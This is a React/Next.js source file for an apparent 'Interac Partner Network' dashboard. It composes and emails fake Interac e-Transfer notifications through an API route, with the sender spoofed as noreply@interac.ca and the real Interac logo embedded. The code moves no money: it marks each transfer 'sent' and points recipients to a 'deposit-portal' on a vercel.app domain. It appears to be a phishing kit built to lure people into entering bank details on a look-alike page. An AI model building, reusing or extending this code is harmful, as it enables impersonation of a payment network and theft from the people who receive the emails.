"use client"

import type React from "react"
import { useState } from "react"
import { Send, DollarSign, Mail, User, ArrowRight, CheckCircle, AlertCircle, Clock, Eye } from "lucide-react"
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from "@/components/ui/card"
import { Button } from "@/components/ui/button"
import { Input } from "@/components/ui/input"
import { Label } from "@/components/ui/label"
import { Textarea } from "@/components/ui/textarea"
import { Dialog, DialogContent, DialogHeader, DialogTitle, DialogDescription } from "@/components/ui/dialog"
import { InteracEmailLayout } from "@/components/email/interac-email-layout"
import { TransferCard } from "@/components/email/transfer-card"
import { MessageSection } from "@/components/email/message-section"
import { useRouter } from "next/navigation"

interface TransferStatus {
  id: string
  recipient: string
  recipientName: string
  amount: number
  status: "pending" | "sent" | "failed"
  timestamp: string
  message?: string
  securityQuestion?: string
}

export default function AdminDashboard() {
  const [isSubmitting, setIsSubmitting] = useState(false)
  const [submitStatus, setSubmitStatus] = useState<{
    type: "success" | "error" | null
    message: string
  }>({ type: null, message: "" })

  const [formData, setFormData] = useState({
    recipientEmail: "",
    recipientName: "",
    amount: "",
    message: "",
    securityQuestion: "",
    securityAnswer: "",
    bankName: "Banking System",
    institutionCode: "000",
    branchCode: "00000",
    reference: "",
  })

  const [recentTransfers, setRecentTransfers] = useState<TransferStatus[]>([])
  const [previewTransfer, setPreviewTransfer] = useState<TransferStatus | null>(null)
  const [showPendingTransfers, setShowPendingTransfers] = useState(false)
  const router = useRouter()

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault()
    setIsSubmitting(true)
    setSubmitStatus({ type: null, message: "" })

    try {
      const reference = formData.reference || `INTC-${Date.now().toString().slice(-6)}`

      const response = await fetch("/api/send-interac", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          ...formData,
          reference,
          senderEmail:
            typeof window !== "undefined"
              ? process.env.NEXT_PUBLIC_SENDER_EMAIL || "noreply@interac.ca"
              : "noreply@interac.ca",
          appUrl: typeof window !== "undefined" ? process.env.NEXT_PUBLIC_APP_URL || window.location.origin : "",
        }),
      })

      const data = await response.json()

      if (!response.ok) {
        throw new Error(data.error || "Failed to send Interac e-Transfer")
      }

      const newTransfer: TransferStatus = {
        id: reference,
        recipient: formData.recipientEmail,
        recipientName: formData.recipientName,
        amount: Number.parseFloat(formData.amount),
        status: "sent",
        timestamp: new Date().toISOString(),
        message: formData.message,
        securityQuestion: formData.securityQuestion,
      }
      setRecentTransfers([newTransfer, ...recentTransfers])

      setSubmitStatus({
        type: "success",
        message: `Interac e-Transfer of $${formData.amount} successfully sent to ${formData.recipientEmail}`,
      })

      setTimeout(() => {
        const transferParams = new URLSearchParams({
          transferId: reference,
          amount: formData.amount,
          recipient: formData.recipientEmail,
          recipientName: formData.recipientName,
          bankName: formData.bankName,
          message: formData.message || "",
          timestamp: new Date().toISOString(),
        })
        router.push(`/deposit-portal?${transferParams.toString()}`)
      }, 2000)

      setFormData({
        recipientEmail: "",
        recipientName: "",
        amount: "",
        message: "",
        securityQuestion: "",
        securityAnswer: "",
        bankName: "Banking System",
        institutionCode: "000",
        branchCode: "00000",
        reference: "",
      })
    } catch (error) {
      setSubmitStatus({
        type: "error",
        message: error instanceof Error ? error.message : "Failed to send Interac e-Transfer",
      })
    } finally {
      setIsSubmitting(false)
    }
  }

  const formatTimestamp = (timestamp: string) => {
    const date = new Date(timestamp)
    return date.toLocaleString("en-US", {
      month: "short",
      day: "numeric",
      hour: "2-digit",
      minute: "2-digit",
    })
  }

  return (
    <div className="min-h-screen bg-gradient-to-br from-slate-50 to-slate-100">
      {/* Header */}
      <header className="border-b bg-white shadow-sm">
        <div className="container mx-auto px-4 py-4 md:py-6">
          <div className="flex items-center justify-between gap-3">
            <div className="flex items-center gap-3">
              <div className="w-12 h-12 bg-[#FDB913] rounded-lg flex items-center justify-center p-2">
                <img
                  src="https://etransfer-notification.interac.ca/images/new/interac_logo.png"
                  alt="Interac Logo"
                  className="w-full h-full object-contain"
                />
              </div>
              <div>
                <h1 className="text-2xl font-bold text-foreground">Interac Partner Network</h1>
                <p className="text-sm text-muted-foreground">e-Transfer Management Dashboard Portal</p>
              </div>
            </div>
            <button
              onClick={() => setShowPendingTransfers(true)}
              className="flex items-center gap-2 px-4 py-2 bg-[#FDB913] text-[#1a1a1a] rounded-lg font-semibold hover:bg-[#e5a811] transition-colors focus:outline-none focus:ring-2 focus:ring-[#FDB913] focus:ring-offset-2"
            >
              <Clock className="w-5 h-5" />
              <span>Pending Transfers</span>
              {recentTransfers.filter((t) => t.status === "pending").length > 0 && (
                <span className="ml-1 px-2 py-0.5 bg-[#1a1a1a] text-[#FDB913] text-xs font-bold rounded-full">
                  {recentTransfers.filter((t) => t.status === "pending").length}
                </span>
              )}
            </button>
          </div>
        </div>
      </header>

      <main className="container mx-auto px-4 py-8 max-w-7xl">
        <div className="grid lg:grid-cols-3 gap-6">
          {/* Transfer Form */}
          <div className="lg:col-span-2">
            <Card className="shadow-lg border-2">
              <CardHeader>
                <CardTitle className="text-2xl flex items-center gap-2">
                  <Send className="w-6 h-6 text-[#FDB913]" />
                  Send Interac e-Transfer
                </CardTitle>
                <CardDescription>Send secure money transfers via email with SendGrid</CardDescription>
              </CardHeader>
              <CardContent>
                <form onSubmit={handleSubmit} className="space-y-6">
                  {/* Recipient Information */}
                  <div className="space-y-4 p-5 bg-muted/50 rounded-lg border">
                    <h3 className="font-semibold text-lg flex items-center gap-2">
                      <User className="w-5 h-5 text-[#FDB913]" />
                      Recipient Information
                    </h3>

                    <div className="grid md:grid-cols-2 gap-4">
                      <div className="space-y-2">
                        <Label htmlFor="recipientEmail" className="flex items-center gap-2">
                          <Mail className="w-4 h-4 text-[#FDB913]" />
                          Email Address
                          <span className="text-red-500">*</span>
                        </Label>
                        <Input
                          id="recipientEmail"
                          type="email"
                          placeholder="recipient@example.com"
                          value={formData.recipientEmail}
                          onChange={(e) => setFormData({ ...formData, recipientEmail: e.target.value })}
                          className="border-2 focus-visible:ring-[#FDB913]"
                          required
                        />
                      </div>

                      <div className="space-y-2">
                        <Label htmlFor="recipientName">
                          Recipient Name
                          <span className="text-red-500 ml-1">*</span>
                        </Label>
                        <Input
                          id="recipientName"
                          type="text"
                          placeholder="John Doe"
                          value={formData.recipientName}
                          onChange={(e) => setFormData({ ...formData, recipientName: e.target.value })}
                          className="border-2 focus-visible:ring-[#FDB913]"
                          required
                        />
                      </div>
                    </div>
                  </div>

                  {/* Transfer Details */}
                  <div className="space-y-4 p-5 bg-muted/50 rounded-lg border">
                    <h3 className="font-semibold text-lg flex items-center gap-2">
                      <DollarSign className="w-5 h-5 text-[#FDB913]" />
                      Transfer Details
                    </h3>

                    <div className="grid md:grid-cols-2 gap-4">
                      <div className="space-y-2">
                        <Label htmlFor="amount">
                          Amount (CAD)
                          <span className="text-red-500 ml-1">*</span>
                        </Label>
                        <Input
                          id="amount"
                          type="number"
                          step="0.01"
                          min="0.01"
                          placeholder="100.00"
                          value={formData.amount}
                          onChange={(e) => setFormData({ ...formData, amount: e.target.value })}
                          className="border-2 focus-visible:ring-[#FDB913] text-lg font-semibold"
                          required
                        />
                      </div>

                      <div className="space-y-2">
                        <Label htmlFor="reference">Reference Number</Label>
                        <Input
                          id="reference"
                          type="text"
                          placeholder="Auto-generated"
                          value={formData.reference}
                          onChange={(e) => setFormData({ ...formData, reference: e.target.value })}
                          className="border-2 focus-visible:ring-[#FDB913] font-mono"
                        />
                      </div>
                    </div>

                    <div className="space-y-2">
                      <Label htmlFor="message">Message (Optional)</Label>
                      <Textarea
                        id="message"
                        placeholder="Add a message for the recipient..."
                        value={formData.message}
                        onChange={(e) => setFormData({ ...formData, message: e.target.value })}
                        className="border-2 focus-visible:ring-[#FDB913] min-h-[100px]"
                        maxLength={200}
                      />
                      <p className="text-xs text-muted-foreground">{formData.message.length}/200 characters</p>
                    </div>

                    {/* Bank Information */}
                    <div className="grid md:grid-cols-3 gap-4 pt-2">
                      <div className="space-y-2">
                        <Label htmlFor="bankName">Bank Name</Label>
                        <Input
                          id="bankName"
                          type="text"
                          placeholder="Banking System"
                          value={formData.bankName}
                          onChange={(e) => setFormData({ ...formData, bankName: e.target.value })}
                          className="border-2 focus-visible:ring-[#FDB913]"
                        />
                      </div>

                      <div className="space-y-2">
                        <Label htmlFor="institutionCode">Institution Code</Label>
                        <Input
                          id="institutionCode"
                          type="text"
                          placeholder="000"
                          value={formData.institutionCode}
                          onChange={(e) => setFormData({ ...formData, institutionCode: e.target.value })}
                          className="border-2 focus-visible:ring-[#FDB913] font-mono"
                          maxLength={3}
                        />
                      </div>

                      <div className="space-y-2">
                        <Label htmlFor="branchCode">Branch Code</Label>
                        <Input
                          id="branchCode"
                          type="text"
                          placeholder="00000"
                          value={formData.branchCode}
                          onChange={(e) => setFormData({ ...formData, branchCode: e.target.value })}
                          className="border-2 focus-visible:ring-[#FDB913] font-mono"
                          maxLength={5}
                        />
                      </div>
                    </div>
                  </div>

                  {/* Security */}
                  <div className="space-y-4 p-5 bg-muted/50 rounded-lg border">
                    <h3 className="font-semibold text-lg">Security Question & Answer</h3>

                    <div className="space-y-2">
                      <Label htmlFor="securityQuestion">
                        Security Question
                        <span className="text-red-500 ml-1">*</span>
                      </Label>
                      <Input
                        id="securityQuestion"
                        type="text"
                        placeholder="e.g., What is your favorite color?"
                        value={formData.securityQuestion}
                        onChange={(e) => setFormData({ ...formData, securityQuestion: e.target.value })}
                        className="border-2 focus-visible:ring-[#FDB913]"
                        required
                      />
                    </div>

                    <div className="space-y-2">
                      <Label htmlFor="securityAnswer">
                        Security Answer
                        <span className="text-red-500 ml-1">*</span>
                      </Label>
                      <Input
                        id="securityAnswer"
                        type="text"
                        placeholder="Enter the answer"
                        value={formData.securityAnswer}
                        onChange={(e) => setFormData({ ...formData, securityAnswer: e.target.value })}
                        className="border-2 focus-visible:ring-[#FDB913]"
                        required
                      />
                      <p className="text-xs text-muted-foreground">
                        The recipient will need this answer to accept the transfer
                      </p>
                    </div>
                  </div>

                  {/* Status Messages */}
                  {submitStatus.type && (
                    <div
                      className={`p-4 rounded-lg border-2 flex items-start gap-3 ${
                        submitStatus.type === "success" ? "bg-green-50 border-green-200" : "bg-red-50 border-red-200"
                      }`}
                    >
                      {submitStatus.type === "success" ? (
                        <CheckCircle className="w-5 h-5 text-green-600 flex-shrink-0 mt-0.5" />
                      ) : (
                        <AlertCircle className="w-5 h-5 text-red-600 flex-shrink-0 mt-0.5" />
                      )}
                      <p
                        className={`text-sm font-medium ${
                          submitStatus.type === "success" ? "text-green-700" : "text-red-700"
                        }`}
                      >
                        {submitStatus.message}
                      </p>
                    </div>
                  )}

                  {/* Submit Button */}
                  <Button
                    type="submit"
                    disabled={isSubmitting}
                    className="w-full bg-[#FDB913] text-[#1a1a1a] hover:bg-[#e5a811] text-lg py-6 font-bold"
                    size="lg"
                  >
                    {isSubmitting ? (
                      <>
                        <div className="w-5 h-5 border-2 border-[#1a1a1a] border-t-transparent rounded-full animate-spin" />
                        <span>Sending...</span>
                      </>
                    ) : (
                      <>
                        <Send className="w-5 h-5" />
                        <span>Send Interac e-Transfer</span>
                        <ArrowRight className="w-5 h-5" />
                      </>
                    )}
                  </Button>
                </form>
              </CardContent>
            </Card>
          </div>

          {/* Recent Transfers Sidebar */}
          <div className="lg:col-span-1">
            <Card className="shadow-lg border-2">
              <CardHeader>
                <CardTitle className="text-xl flex items-center gap-2">
                  <Clock className="w-5 h-5 text-[#FDB913]" />
                  Recent Transfers
                </CardTitle>
                <CardDescription>Last 10 transactions</CardDescription>
              </CardHeader>
              <CardContent>
                <div className="space-y-3">
                  {recentTransfers.length === 0 ? (
                    <p className="text-sm text-muted-foreground text-center py-8">No recent transfers</p>
                  ) : (
                    recentTransfers.map((transfer) => (
                      <div
                        key={transfer.id}
                        className="p-4 rounded-lg border-2 bg-card hover:bg-muted/50 transition-colors cursor-pointer group"
                        onClick={() => setPreviewTransfer(transfer)}
                      >
                        <div className="flex items-start justify-between mb-2">
                          <div className="flex-1 min-w-0">
                            <p className="font-semibold text-sm truncate">{transfer.recipientName}</p>
                            <p className="text-xs text-muted-foreground truncate">{transfer.recipient}</p>
                            <p className="text-xs text-muted-foreground">{formatTimestamp(transfer.timestamp)}</p>
                          </div>
                          <div className="flex items-center gap-2">
                            <Eye className="w-4 h-4 text-[#FDB913] opacity-0 group-hover:opacity-100 transition-opacity" />
                            <div
                              className={`px-2 py-1 rounded text-xs font-medium ${
                                transfer.status === "sent"
                                  ? "bg-green-100 text-green-700"
                                  : transfer.status === "pending"
                                    ? "bg-yellow-100 text-yellow-700"
                                    : "bg-red-100 text-red-700"
                              }`}
                            >
                              {transfer.status}
                            </div>
                          </div>
                        </div>
                        <div className="flex items-center justify-between">
                          <span className="text-lg font-bold text-[#FDB913]">${transfer.amount.toFixed(2)} CAD</span>
                          <span className="text-xs text-muted-foreground font-mono">{transfer.id}</span>
                        </div>
                      </div>
                    ))
                  )}
                </div>
              </CardContent>
            </Card>
          </div>
        </div>
      </main>

      <Dialog open={previewTransfer !== null} onOpenChange={() => setPreviewTransfer(null)}>
        <DialogContent className="max-w-5xl max-h-[90vh] overflow-y-auto">
          <DialogHeader>
            <DialogTitle className="flex items-center gap-2">
              <Mail className="w-5 h-5 text-[#FDB913]" />
              Transaction Details - {previewTransfer?.id}
            </DialogTitle>
          </DialogHeader>

          {previewTransfer && (
            <div className="space-y-6 mt-4">
              {/* Transaction Summary Card */}
              <div className="bg-zinc-900 rounded-2xl border border-zinc-800 p-6 space-y-6">
                <div className="flex items-center justify-between pb-4 border-b border-zinc-800">
                  <h3 className="text-lg font-semibold text-white">Transaction Details</h3>
                  <span className="px-3 py-1 rounded-full text-xs font-medium bg-green-500/10 text-green-400 border border-green-500/20">
                    {previewTransfer.status.toUpperCase()}
                  </span>
                </div>

                <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
                  <div className="space-y-1">
                    <p className="text-sm text-zinc-500">Amount</p>
                    <p className="text-xl font-bold text-white">${previewTransfer.amount.toFixed(2)} CAD</p>
                  </div>

                  <div className="space-y-1">
                    <p className="text-sm text-zinc-500">Reference</p>
                    <p className="text-base font-mono text-white">{previewTransfer.id}</p>
                  </div>

                  <div className="space-y-1">
                    <p className="text-sm text-zinc-500">Payee</p>
                    <p className="text-base text-white">{previewTransfer.recipientName}</p>
                    <p className="text-sm text-zinc-400">{previewTransfer.recipient}</p>
                  </div>

                  <div className="space-y-1">
                    <p className="text-sm text-zinc-500">Bank</p>
                    <p className="text-base text-white">{formData.bankName}</p>
                    <p className="text-sm text-zinc-400">
                      {formData.institutionCode}-{formData.branchCode}
                    </p>
                  </div>

                  {previewTransfer.message && (
                    <div className="space-y-1 md:col-span-2">
                      <p className="text-sm text-zinc-500">Memo</p>
                      <p className="text-base text-white">{previewTransfer.message}</p>
                    </div>
                  )}

                  <div className="space-y-1 md:col-span-2">
                    <p className="text-sm text-zinc-500">Timestamp</p>
                    <p className="text-sm font-mono text-zinc-400">
                      {new Date(previewTransfer.timestamp).toLocaleString()}
                    </p>
                  </div>
                </div>
              </div>

              {/* Email Preview */}
              <div className="border rounded-lg p-4 bg-white">
                <h4 className="font-semibold mb-4 text-zinc-900">Email Preview</h4>
                <InteracEmailLayout senderName={formData.bankName} institution="Your Bank">
                  <MessageSection
                    recipientName={previewTransfer.recipientName}
                    greeting={`Hi ${previewTransfer.recipientName},`}
                    description="You've received a secure Interac e-Transfer."
                  />

                  <TransferCard
                    amount={previewTransfer.amount}
                    message={previewTransfer.message}
                    securityQuestion={previewTransfer.securityQuestion || "Security question not provided"}
                    depositLink="https://v0-interacadvancededition-git-main-nykeygpts-projects.vercel.app/deposit-portal"
                    transferId={previewTransfer.id}
                  />
                </InteracEmailLayout>
              </div>
            </div>
          )}
        </DialogContent>
      </Dialog>

      {/* Pending Transfers Modal */}
      <Dialog open={showPendingTransfers} onOpenChange={setShowPendingTransfers}>
        <DialogContent className="max-w-2xl max-h-[90vh] overflow-y-auto">
          <DialogHeader>
            <DialogTitle className="flex items-center gap-2">
              <Clock className="w-5 h-5 text-[#FDB913]" />
              Pending Transfers
            </DialogTitle>
            <DialogDescription>
              {recentTransfers.filter((t) => t.status === "pending").length} pending transfer(s)
            </DialogDescription>
          </DialogHeader>

          <div className="space-y-3 mt-4">
            {recentTransfers.filter((t) => t.status === "pending").length === 0 ? (
              <p className="text-sm text-muted-foreground text-center py-8">No pending transfers</p>
            ) : (
              recentTransfers
                .filter((t) => t.status === "pending")
                .map((transfer) => (
                  <div
                    key={transfer.id}
                    className="p-4 rounded-lg border-2 bg-card hover:bg-muted/50 transition-colors cursor-pointer group"
                    onClick={() => {
                      setPreviewTransfer(transfer)
                      setShowPendingTransfers(false)
                    }}
                  >
                    <div className="flex items-start justify-between mb-2">
                      <div className="flex-1 min-w-0">
                        <p className="font-semibold text-sm truncate">{transfer.recipientName}</p>
                        <p className="text-xs text-muted-foreground truncate">{transfer.recipient}</p>
                        <p className="text-xs text-muted-foreground">{formatTimestamp(transfer.timestamp)}</p>
                      </div>
                      <div className="flex items-center gap-2">
                        <Eye className="w-4 h-4 text-[#FDB913] opacity-0 group-hover:opacity-100 transition-opacity" />
                        <div className="px-2 py-1 rounded text-xs font-medium bg-yellow-100 text-yellow-700">
                          pending
                        </div>
                      </div>
                    </div>
                    <div className="flex items-center justify-between">
                      <span className="text-lg font-bold text-[#FDB913]">${transfer.amount.toFixed(2)} CAD</span>
                      <span className="text-xs text-muted-foreground font-mono">{transfer.id}</span>
                    </div>
                  </div>
                ))
            )}
          </div>
        </DialogContent>
      </Dialog>
    </div>
  )
}
